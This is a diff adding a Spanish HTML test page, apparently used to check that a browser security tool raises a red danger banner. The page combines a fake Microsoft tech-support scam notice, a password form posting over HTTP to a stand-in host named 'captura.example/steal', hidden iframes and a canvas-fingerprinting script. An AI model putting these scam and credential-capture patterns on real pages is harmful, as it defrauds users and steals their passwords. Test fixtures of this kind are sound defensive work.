@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="es">
+<head><meta charset="UTF-8"><title>Prueba: combinación de nivel ROJO</title></head>
+<body style="font: 15px/1.5 system-ui, sans-serif; max-width: 700px; margin: 40px auto;">
+  <h1>🛑 Prueba: combo de peligro</h1>
+  <p><b>Esperado:</b> estafa (+45) + iframes ocultos (+25) + contraseña por HTTP (+50)
+     + login a otro dominio (+35) + canvas (+20) = 175 →
+     <b>banner ROJO</b> + notificación de peligro (prioridad alta).</p>
+  <hr>
+
+  <div style="border: 2px solid #c00; padding: 16px; border-radius: 8px;">
+    <h2>⚠️ Su equipo ha sido infectado</h2>
+    <p>Virus detectado. Llame ya al 900-000-000: soporte técnico de Microsoft.</p>
+  </div>
+
+  <form action="http://captura.example/steal" method="post"
+        style="border: 1px solid #ccc; padding: 16px; border-radius: 8px; max-width: 320px; margin-top: 16px;">
+    <p><label>Contraseña<br><input type="password" name="pass"></label></p>
+    <button type="button">Verificar (no hace nada)</button>
+  </form>
+
+  <iframe src="/clean.html" style="opacity: 0; width: 200px; height: 80px;"></iframe>
+  <iframe src="/clean.html" style="visibility: hidden; width: 200px; height: 80px;"></iframe>
+
+  <canvas id="c" width="100" height="30"></canvas>
+  <script>
+    const c = document.getElementById("c");
+    const ctx = c.getContext("2d", { willReadFrequently: true });
+    for (let i = 0; i < 3; i++) { c.toDataURL(); ctx.getImageData(0, 0, 5, 5); }
+  </script>
+
+  <p><a href="/index.html">← Volver al índice</a></p>
+</body>
+</html>
